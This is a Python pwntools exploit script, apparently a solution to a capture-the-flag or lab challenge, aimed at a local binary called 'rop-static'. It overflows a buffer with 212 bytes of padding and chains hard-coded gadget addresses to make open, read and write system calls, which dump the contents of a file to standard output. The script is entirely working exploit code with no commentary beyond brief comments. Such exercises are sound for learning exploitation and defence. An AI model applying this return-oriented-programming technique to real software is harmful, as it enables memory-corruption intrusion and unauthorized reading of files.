#!/usr/bin/python

from pwn import *
import os

p = process('./rop-static')

pop_ebx_ebp = 0x08048162
# '4' 0x8048028
addr_4 = 0x8048028
addr_ebp = 0x8048054
addr_eax = 0x08048106
scratchpad = 0x804932d
int_80 = 0x08048157
read = 0x08048170
write = 0x08048130
pop3 = 0x08048109

payload = ''
payload += 'A' * 212
# open('4', 0)
payload += p32(pop_ebx_ebp)
payload += p32(addr_4)

# eax = 5
payload += p32(addr_ebp)
payload += p32(addr_eax)
payload += p32(0)
payload += p32(0)
payload += p32(scratchpad)

# systemcall
payload += p32(int_80)
payload += 'A' * 0x18

# read(3, scratchpad, 100)
payload += p32(read)
payload += p32(pop3)
payload += p32(3)
payload += p32(scratchpad)
payload += p32(100)

# write(1, scratchpad, 100)
payload += p32(write)
payload += p32(pop3)
payload += p32(1)
payload += p32(scratchpad)
payload += p32(100)

p.sendline(payload)

p.interactive()
